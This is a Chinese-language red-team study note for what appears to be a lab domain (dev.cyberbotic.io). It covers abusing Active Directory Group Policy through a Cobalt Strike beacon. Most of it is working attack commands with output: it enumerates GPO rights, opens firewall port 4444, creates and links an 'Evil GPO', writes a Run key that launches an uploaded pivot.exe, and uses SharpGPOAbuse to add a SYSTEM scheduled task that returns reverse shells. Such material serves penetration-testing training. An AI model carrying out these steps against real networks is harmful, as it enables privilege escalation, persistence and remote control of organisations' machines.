# Group Policy

什么是组策略？
> 域中控制用户和计算机配置的中央数据库。组策略对象 (GPO) 是应用于组织单位 (OU) 的配置集，作为 OU 成员的任何用户或计算机都将应用这些配置。

什么用户可以创建组策略对象（GPO）？
> 默认配置下只有DA可以创建，但通常会将这些权限委派给其他组成员。

利用时机？
> 当某一组用户有权限创建应用于特权组成员（如DA）的GPO时，可以利用其来进行特权提升。又或者，某个用户可以创建应用于某些计算机的GPO时，可以利用其来进行横向移动或者权限维持。

怎么利用？
> 可以通过创建新的GPO，或者修改现有的GPO来获得code execution


枚举能过创建GPO的SID
然后通过```ConvertFrom-SID```命令查找这个SID是哪个组下的
```
beacon> powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : CreateChild
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125

DEV\1st Line Support
```


This query will return the principals that can write to the GP-Link attribute on OUs:
```
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl

ObjectDN           : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Tier 1,OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Tier 2,OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125
```

从上面的输出可以看到，```1st Line Support```域组既可以创建新的 GPO ，也可以将它们链接到多个 OU。
 如果更多的特权用户被认证到这些OU内的任何机器上，这可能导致特权升级。还可以想象一下，如果我们可以将GPO链接到包含敏感文件或数据库服务器的OU上--我们可以使用这些GPO来访问这些机器，随后访问存储在这些机器上的数据。



获取某个OU的计算机列表
```
beacon> powershell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName

dnshostname            
-----------            
srv-1.dev.cyberbotic.io
```


下面查询返回所有拥有WriteProperty、WriteDacl或WriteOwner权限的SID
```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN={AD7EE1ED-CDC8-4994-AE0F-50BA8B264829},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1126

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126
DEV\Developers
```

查看上面结果中ObjectDN的名字
```
beacon> powershell Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName

displayname       
-----------       
PowerShell Logging
```

在BloodHound中的查询
```
MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p
```

![alt GPO](https://rto-assets.s3.eu-west-2.amazonaws.com/group-policy/devs-genericwrite.png?width=1920)

# Pivot Listeners

其实这里就是监听，前面一直都是正向连接shell，这里是反向连接shell，从靶机到CS，因为GPO作用的时间可能不可控，当命令生效时马上反向连接到CS，在这个场景下reverse shell是比较好的策略。

CS新建一个rev shell

![alt rev](https://rto-assets.s3.eu-west-2.amazonaws.com/pivot-listener/new-pivot-listener.png?width=1920)

注意监听的端口是否在靶机上运行出站


使用```netsh```命令允许防火墙让4444端口出站
```
netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
```

删除上面的出站规则
```
netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444
```

# Remote Server Administration Tools (RSAT)

RSAT(Remote Server Administration Tools)是 是 Microsoft 提供的一个管理组件，期中GroupPolicy 模块具有多个可用于管理 GPO 的 PowerShell cmdlet，包括

- New-GPO：创建一个新的空 GPO。
- New-GPLink：将 GPO 链接到站点、域或 OU。
- Set-GPPrefRegistryValue：在计算机或用户配置下配置注册表首选项。
- Set-GPRegistryValue：在计算机或用户配置下配置一个或多个基于注册表的策略设置。
- Get-GPOReport：生成 XML 或 HTML 格式的报告。


检查是否安装了GroupPolicy 模块
```
Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
```

安装GroupPolicy 模块，需要本地管理员权限
```
Install-WindowsFeature –Name GPM
```

创建一个空的GPO，并且链接到指定的OU上
```
beacon> getuid
[*] You are DEV\jking

beacon> powershell New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

GpoId       : d9de5634-cc47-45b5-ae52-e7370e4a4d22
DisplayName : Evil GPO
Enabled     : True
Enforced    : False
Target      : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Order       : 4
```

查找靶机可写入文件夹
```
beacon> powershell Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
software          0                     dc-2.dev.cyberbotic.io
```


把rev shell上传到靶机
```
beacon> cd \\dc-2\software
beacon> upload C:\Payloads\pivot.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 281kb    fil     03/10/2021 13:54:10   pivot.exe
```



写入GPO内容，执行我们上面上传的pivot.exe
```
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString

DisplayName      : Evil GPO
DomainName       : dev.cyberbotic.io
Owner            : DEV\jking
Id               : d9de5634-cc47-45b5-ae52-e7370e4a4d22
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 5/26/2021 2:35:02 PM
ModificationTime : 5/26/2021 2:42:08 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 1, SysVol Version: 1
WmiFilter        : 
```

新写入的GPO可能要隔几个小时才会被刷新触发，需要马上触发执行下面命令(访问 WKSTN-2 控制台)
```
gpupdate /target:computer /force
```

# SharpGPOAbuse

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)这个工具不可以创建GPO，但是可以编辑现有的GPO

下面命令编辑一条登录即可触发的GPO，并且添加了一个即时执行的定时任务

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"

[+] Domain = dev.cyberbotic.io
[+] Domain Controller = dc-2.dev.cyberbotic.io
[+] Distinguished Name = CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
[+] GUID of "PowerShell Logging" is: {AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}
[+] Creating file \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

上面命令执行完成以后，会收到很多rev shell(但是看视频演示还是要上靶机强制刷新GPO)

![alt GPOAbuse](https://rto-assets.s3.eu-west-2.amazonaws.com/group-policy/sharpgpoabuse.png?width=1920)